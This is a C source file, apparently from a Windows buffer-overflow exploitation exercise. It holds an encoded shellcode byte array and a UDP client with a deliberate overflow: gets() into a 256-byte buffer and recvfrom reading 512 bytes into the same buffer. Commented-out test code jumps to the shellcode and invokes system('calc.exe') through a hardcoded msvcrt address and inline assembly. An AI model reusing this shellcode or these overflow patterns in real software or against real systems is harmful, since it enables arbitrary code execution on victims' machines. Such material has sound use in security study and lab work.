#include "stdafx.h"

#define BUF_SIZE 256

unsigned char shellcode[] = 
"\xdb\xd5\xd9\x74\x24\xf4\xbb\xa3\xe7\xd8\xa5\x5a\x29\xc9\xb1"
"\x31\x31\x5a\x18\x03\x5a\x18\x83\xea\x5f\x05\x2d\x59\x77\x48"
"\xce\xa2\x87\x2d\x46\x47\xb6\x6d\x3c\x03\xe8\x5d\x36\x41\x04"
"\x15\x1a\x72\x9f\x5b\xb3\x75\x28\xd1\xe5\xb8\xa9\x4a\xd5\xdb"
"\x29\x91\x0a\x3c\x10\x5a\x5f\x3d\x55\x87\x92\x6f\x0e\xc3\x01"
"\x80\x3b\x99\x99\x2b\x77\x0f\x9a\xc8\xcf\x2e\x8b\x5e\x44\x69"
"\x0b\x60\x89\x01\x02\x7a\xce\x2c\xdc\xf1\x24\xda\xdf\xd3\x75"
"\x23\x73\x1a\xba\xd6\x8d\x5a\x7c\x09\xf8\x92\x7f\xb4\xfb\x60"
"\x02\x62\x89\x72\xa4\xe1\x29\x5f\x55\x25\xaf\x14\x59\x82\xbb"
"\x73\x7d\x15\x6f\x08\x79\x9e\x8e\xdf\x08\xe4\xb4\xfb\x51\xbe"
"\xd5\x5a\x3f\x11\xe9\xbd\xe0\xce\x4f\xb5\x0c\x1a\xe2\x94\x5a"
"\xdd\x70\xa3\x28\xdd\x8a\xac\x1c\xb6\xbb\x27\xf3\xc1\x43\xe2"
"\xb0\x3e\x0e\xaf\x90\xd6\xd7\x25\xa1\xba\xe7\x93\xe5\xc2\x6b"
"\x16\x95\x30\x73\x53\x90\x7d\x33\x8f\xe8\xee\xd6\xaf\x5f\x0e"
"\xf3\xd3\x3e\x9c\x9f\x3d\xa5\x24\x05\x42";

typedef void (*MYPROC)(LPTSTR); 

char * client_deal(SOCKET sock, sockaddr_in servAddr,sockaddr fromAddr, int addrLen){
	char buffer[BUF_SIZE] = {0};
	printf("Input a string: ");
	gets(buffer);
	sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr*)&servAddr, sizeof(servAddr));

	int strLen = recvfrom(sock, buffer, 512, 0, &fromAddr, &addrLen);
	printf("Message form server: %s\n", buffer);
	
	return buffer;
}

int main(void){
	// 测试 shellcode
	//void (*fun)();
	//*(int *)&fun=(int)shellcode;
	//fun();
	//return 0;	

	//int * ret;
	//HINSTANCE LibHandle;
	//MYPROC ProcAdd;
	//char sysbuf[7] = "system";
	//char cmdbuf[16] = "calc.exe";
	//LibHandle = LoadLibrary("msvcrt.dll");
	//ProcAdd = (MYPROC)GetProcAddress(LibHandle,sysbuf); // 0x77bf93c7
	//(ProcAdd)(cmdbuf);
	//return 0;


	//测试 Done
	/*
	__asm{
	xor eax,eax			// "\0"
	push eax
	mov eax,0x6578652e 	// "exe." <- ".exe"
	push eax
	mov eax,0x636c6163 	// "clac" <- "calc"
	push eax
	lea eax,[esp]		// 字符串 "calc.exe" 的地址
	push eax
	mov ecx,0x77bf93c7	// system 调用
	call ecx
	}
	return 0;
	*/

	//初始化DLL
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	//创建套接字
	SOCKET sock = socket(PF_INET, SOCK_DGRAM, 0);

	//服务器地址信息
	sockaddr_in servAddr;
	memset(&servAddr, 0, sizeof(servAddr));  //每个字节都用0填充
	servAddr.sin_family = PF_INET;
	servAddr.sin_addr.s_addr = inet_addr("192.168.117.1");
	servAddr.sin_port = htons(9999);

	//不断获取用户输入并发送给服务器，然后接受服务器数据
	sockaddr fromAddr;
	int addrLen = sizeof(fromAddr);
	while(1){
		client_deal(sock, servAddr, fromAddr, addrLen);
	}

	closesocket(sock);
	WSACleanup();
	return 0;
}